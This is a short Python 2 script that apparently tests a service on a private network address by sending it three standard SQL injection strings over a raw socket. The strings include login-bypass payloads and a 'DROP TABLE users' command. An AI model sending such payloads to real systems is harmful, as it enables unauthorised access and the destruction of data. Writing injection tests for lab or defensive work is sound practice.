import socket

def client(string):

    HOST = "192.168.14.17"
    PORT = 10000
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    sock.send(string)
    print sock.recv(2048)
    sock.close()


def main():
	SQL_INJECTION_PATTERNS = ["' OR '1'='1",
							  "' OR '1'='1' --",
							  "1;DROP TABLE users"]
	for msg in SQL_INJECTION_PATTERNS:
		client(msg)

if __name__ == '__main__':
    main()